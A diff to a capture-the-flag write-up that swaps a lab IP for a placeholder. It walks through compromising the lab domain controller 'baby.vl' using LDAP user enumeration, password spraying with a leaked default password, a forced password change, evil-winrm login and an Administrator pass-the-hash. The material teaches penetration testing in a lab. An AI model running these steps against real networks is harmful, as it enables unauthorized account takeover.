@@ -1,8 +1,8 @@
 # Enumeration
 ```bash
- sudo nmap -sC -sV 10.129.234.71 -p- -T5                                                     
+ sudo nmap -sC -sV <target's ip> -p- -T5                                                     
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 09:41 +0300
-Nmap scan report for 10.129.234.71
+Nmap scan report for <target's ip>
 Host is up (0.053s latency).
 Not shown: 65514 filtered tcp ports (no-response)
 PORT      STATE SERVICE       VERSION
@@ -82,20 +82,20 @@ Host script results:
 Trying to login in the `SMB` using empty (guest) credentials didn't get us something. So we try anonymous login for the `LDAP`, simultaneously extracting the data about users (using NetExec).
 
 ```bash
-nxc ldap  10.129.234.71 --users-export /home/lilith/CTF/baby/userlistnxc.txt                                       
-LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
-LDAP        10.129.234.71   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
-LDAP        10.129.234.71   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-          
-LDAP        10.129.234.71   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
-LDAP        10.129.234.71   389    BABYDC           Jacqueline.Barnett            2021-11-21 17:11:03 0                               
-LDAP        10.129.234.71   389    BABYDC           Ashley.Webb                   2021-11-21 17:11:03 0                               
-LDAP        10.129.234.71   389    BABYDC           Hugh.George                   2021-11-21 17:11:03 0                               
-LDAP        10.129.234.71   389    BABYDC           Leonard.Dyer                  2021-11-21 17:11:03 0                               
-LDAP        10.129.234.71   389    BABYDC           Connor.Wilkinson              2021-11-21 17:11:08 0                               
-LDAP        10.129.234.71   389    BABYDC           Joseph.Hughes                 2021-11-21 17:11:08 0                               
-LDAP        10.129.234.71   389    BABYDC           Kerry.Wilson                  2021-11-21 17:11:08 0                               
-LDAP        10.129.234.71   389    BABYDC           Teresa.Bell                   2021-11-21 17:14:37 0        Set initial password to BabyStart123!
-LDAP        10.129.234.71   389    BABYDC           [*] Writing 9 local users to /home/lilith/CTF/baby/userlistnxc.txt
+nxc ldap  <target's ip> --users-export /home/lilith/CTF/baby/userlistnxc.txt                                       
+LDAP        <target's ip>   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        <target's ip>   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
+LDAP        <target's ip>   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-          
+LDAP        <target's ip>   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
+LDAP        <target's ip>   389    BABYDC           Jacqueline.Barnett            2021-11-21 17:11:03 0                               
+LDAP        <target's ip>   389    BABYDC           Ashley.Webb                   2021-11-21 17:11:03 0                               
+LDAP        <target's ip>   389    BABYDC           Hugh.George                   2021-11-21 17:11:03 0                               
+LDAP        <target's ip>   389    BABYDC           Leonard.Dyer                  2021-11-21 17:11:03 0                               
+LDAP        <target's ip>   389    BABYDC           Connor.Wilkinson              2021-11-21 17:11:08 0                               
+LDAP        <target's ip>   389    BABYDC           Joseph.Hughes                 2021-11-21 17:11:08 0                               
+LDAP        <target's ip>   389    BABYDC           Kerry.Wilson                  2021-11-21 17:11:08 0                               
+LDAP        <target's ip>   389    BABYDC           Teresa.Bell                   2021-11-21 17:14:37 0        Set initial password to BabyStart123!
+LDAP        <target's ip>   389    BABYDC           [*] Writing 9 local users to /home/lilith/CTF/baby/userlistnxc.txt
 ```
 
  `Teresa.Bell` - rewarded our efforts.  **Password** - `BabyStart123!`
@@ -164,28 +164,28 @@ ldapsearch -x   # use simple authentication
 # Password Spraying - Foothold
 Since we have a password and a list of users, we can perform `Password Spraying` technique, where we try one password for each user 
 ```bash
-nxc ldap  10.129.234.71 -u userlistnxc.txt -p 'BabyStart123!'                              
-LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\it:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
-LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
+nxc ldap  <target's ip> -u userlistnxc.txt -p 'BabyStart123!'                              
+LDAP        <target's ip>   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\it:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
+LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
 ```
 We found the username `Caroline.Robinson` and the password status `STATUS_PASSWORD_MUST_CHANGE`!
 In this case we must change password, otherwise account won't function properly.
@@ -194,10 +194,10 @@ In this case we must change password, otherwise account won't function properly.
 netexec smb BABYDC.baby.vl -u Caroline.Robinson -p password.... --pass-pol     # checking password policy of the Domain Controller
 ```
 ```bash
-nxc smb  10.129.234.71 -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS='password123!!!'
-SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
-CHANGE-P... 10.129.234.71   445    BABYDC           [+] Successfully changed password for Caroline.Robinson
+nxc smb  <target's ip> -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS='password123!!!'
+SMB         <target's ip>   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         <target's ip>   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... <target's ip>   445    BABYDC           [+] Successfully changed password for Caroline.Robinson
 ```
 ---
 #### Why  SMB is used for password changing ?
@@ -209,14 +209,14 @@ CHANGE-P... 10.129.234.71   445    BABYDC           [+] Successfully changed pas
 
 We successfully log in using our new password and user found before.
 ```bash
-evil-winrm-py -i 10.129.234.71 -u 'Caroline.Robinson' -p 'password123!!!'                             
+evil-winrm-py -i <target's ip> -u 'Caroline.Robinson' -p 'password123!!!'                             
           _ _            _                             
   _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
  / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
  \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                             |_|   |__/  v1.6.0
 
-[*] Connecting to '10.129.234.71:5985' as 'Caroline.Robinson'
+[*] Connecting to '<target's ip>:5985' as 'Caroline.Robinson'
 evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> dir
 ```
 
@@ -522,13 +522,13 @@ Confirming our credential using SMB (unnecesary)
 ```bash
 nxc smb BABYDC.baby.vl -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d                                     
  
-SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.234.71   445    BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
+SMB         <target's ip>   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         <target's ip>   445    BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
 ```
 
 Final log in!
 ```powershell
-evil-winrm-py -i 10.129.234.71 -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d
+evil-winrm-py -i <target's ip> -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d
 evil-winrm-py PS C:\Users\Administrator\Documents> whoami /priv
 
 PRIVILEGES INFORMATION
